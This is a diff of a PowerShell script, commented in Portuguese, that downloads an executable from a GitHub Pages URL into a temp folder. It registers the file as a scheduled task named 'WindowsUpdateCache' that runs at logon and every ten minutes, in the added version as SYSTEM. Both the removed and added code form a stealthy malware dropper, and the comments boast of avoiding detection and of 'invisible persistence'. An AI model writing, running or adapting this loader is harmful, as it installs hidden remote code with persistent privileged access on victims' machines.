@@ -1,14 +1,26 @@
-$dir = "$env:TEMP\sys_cache"
-if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
+# Configurações
+$folder = "$env:TEMP\sys_cache"
+$exePath = "$folder\sys_cache.exe"
+$url = "https://syslog992.github.io/sys-cache-update/sys_cache.exe"
+$taskName = "WindowsUpdateCache"
 
-# Download via BITSADMIN (Mais discreto e evita detecção de download via script)
-start-process "bitsadmin" -ArgumentList "/transfer mydownloadjob https://syslog992.github.io/sys-cache-update/sys_cache.exe $dir\sys_cache.exe" -Wait
+# 1. Cria a pasta de forma forçada
+if (!(Test-Path $folder)) {
+    New-Item -ItemType Directory -Force -Path $folder
+}
 
-# Criação de Tarefa Agendada para persistência
-# Registra a tarefa para o usuário atual para evitar erro de "Acesso Negado" (não exige Admin)
-$action = New-ScheduledTaskAction -Execute "$dir\sys_cache.exe"
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdateCache" -Force
+# 2. Baixa o executável (usando WebClient para maior compatibilidade)
+try {
+    (New-Object System.Net.WebClient).DownloadFile($url, $exePath)
+} catch {
+    exit
+}
 
-# Inicia o executável imediatamente em modo oculto
-Start-Process "$dir\sys_cache.exe" -WindowStyle Hidden
+# 3. Cria a Tarefa Agendada para persistência invisível
+# Executa ao fazer logon e repete a cada 10 minutos
+$action = New-ScheduledTaskAction -Execute $exePath
+$trigger1 = New-ScheduledTaskTrigger -AtLogOn
+$trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
+
+# Registra a tarefa silenciosamente
+Register-ScheduledTask -Action $action -Trigger $trigger1, $trigger2 -TaskName $taskName -User "SYSTEM" -Force
